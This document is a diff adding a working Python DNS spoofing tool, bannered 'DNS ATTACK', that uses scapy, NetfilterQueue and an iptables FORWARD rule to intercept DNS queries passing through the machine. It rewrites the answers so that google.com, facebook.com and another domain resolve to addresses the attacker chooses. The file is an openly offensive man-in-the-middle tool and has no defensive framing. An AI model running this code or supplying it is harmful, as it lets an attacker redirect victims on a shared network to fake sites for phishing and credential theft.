@@ -1,0 +1,64 @@
+import os
+import logging as log
+from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+from netfilterqueue import NetfilterQueue
+
+# Clear the screen and print banner
+os.system("clear")
+print("\n-----------------------------------------------------")
+print("------------- DNS A T T A C K -----------------------")
+print("-----------------------------------------------------\n")
+
+class DnsSpoof:
+    def __init__(self, host_dict, queue_num):
+        self.host_dict = host_dict
+        self.queue_num = queue_num
+        self.queue = NetfilterQueue()
+
+    def run(self):
+        log.info("Spoofing started...")
+        # Add iptables rule to capture forwarded packets
+        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
+        try:
+            self.queue.bind(self.queue_num, self.process_packet)
+            self.queue.run()
+        except KeyboardInterrupt:
+            log.info("Detected CTRL+C! Flushing iptables and exiting.")
+            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
+            self.queue.unbind()
+
+    def process_packet(self, packet):
+        scapy_packet = IP(packet.get_payload())
+        if scapy_packet.haslayer(DNS) and scapy_packet.haslayer(DNSQR):
+            qname = scapy_packet[DNSQR].qname
+            if qname in self.host_dict:
+                spoofed_ip = self.host_dict[qname]
+                log.info(f"Spoofing {qname.decode()} -> {spoofed_ip}")
+                # Create fake DNS response
+                answer = DNSRR(rrname=qname, rdata=spoofed_ip)
+                scapy_packet[DNS].an = answer
+                scapy_packet[DNS].ancount = 1
+                # Remove checksum and length so Scapy recalculates them
+                del scapy_packet[IP].len
+                del scapy_packet[IP].chksum
+                del scapy_packet[UDP].len
+                del scapy_packet[UDP].chksum
+                # Set modified packet
+                packet.set_payload(bytes(scapy_packet))
+        packet.accept()
+
+if __name__ == '__main__':
+    try:
+        host_dict = {
+            b"google.com.": "192.168.1.100",
+            b"facebook.com.": "192.168.1.100",
+            b"metbkc.com.": "192.79.62.93"
+        }
+
+        queue_num = 0
+        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
+        spoof = DnsSpoof(host_dict, queue_num)
+        spoof.run()
+
+    except OSError as e:
+        log.error(f"OS error: {e}")
